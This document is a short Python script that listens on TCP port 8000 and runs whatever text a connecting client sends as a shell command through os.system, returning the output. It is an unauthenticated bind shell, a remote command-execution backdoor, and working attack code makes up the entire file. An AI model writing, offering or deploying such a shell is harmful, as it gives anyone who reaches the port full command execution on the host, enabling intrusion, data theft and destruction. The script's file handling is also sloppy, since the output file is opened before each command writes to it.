import socket
import sys
import os
import subprocess
os.system("cd"+">result.txt")
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("socket created")
except:
    print("failed to create socket")
    sys.exit()
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
PORT = 8000
s.bind((ip_address, PORT))
print(ip_address + ':' +str(PORT))
s.listen(1)


def listToString(s):
    # initialize an empty string
    str1 = ""
    # traverse in the string
    for ele in s:
        str1 += ele
        # return string
    return str1

while 1:
    file1 = open("result.txt", "r")
    client, addr = s.accept()
    msg = client.recv(1024).decode()
    os.system(msg+">result.txt")
    txt = file1.readlines()
    stxt = listToString(txt)
    print(stxt)
    # os.system(msg)
    try:
        if len(stxt)<= 0:
            client.send(bytes("'"+msg + "'is not recognized as an internal or external command,operable program or batch file", "utf-8"))
        else:
            client.send(bytes(stxt,"utf-8"))
    except:
        print()
    file1.close()
    client.close()


